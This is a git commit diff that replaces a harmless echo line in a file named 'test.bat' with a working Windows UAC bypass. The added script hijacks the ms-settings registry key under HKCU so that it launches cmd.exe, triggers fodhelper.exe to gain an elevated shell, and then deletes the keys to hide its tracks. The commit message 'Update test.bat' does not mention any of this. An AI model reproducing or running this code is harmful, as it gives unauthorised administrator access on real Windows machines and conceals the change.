ec1253675d0de60719ae1f251b4cef1e31cb12bd
Cerial <163851166+Maximus16adrianu@users.noreply.github.com>
2026-04-14 11:09:54 +0200

    Update test.bat

--- test.bat
+++ test.bat
@@ -1,3 +1,21 @@
 @echo off
-echo heyya it worked
+:: Check if already admin
+fsutil dirty query %systemdrive% >nul 2>&1
+if %errorlevel% EQU 0 goto :already_admin
+
+:: Create registry hijack
+reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /f
+reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f  
+reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /t REG_SZ /d "cmd.exe" /f
+
+:: Trigger bypass
+start fodhelper.exe
+
+:: Cleanup
+timeout /t 3 /nobreak >nul
+reg delete HKCU\Software\Classes\ms-settings\Shell\Open\command /f >nul 2>&1
+exit
+
+:already_admin
+echo Already running as admin!
 pause
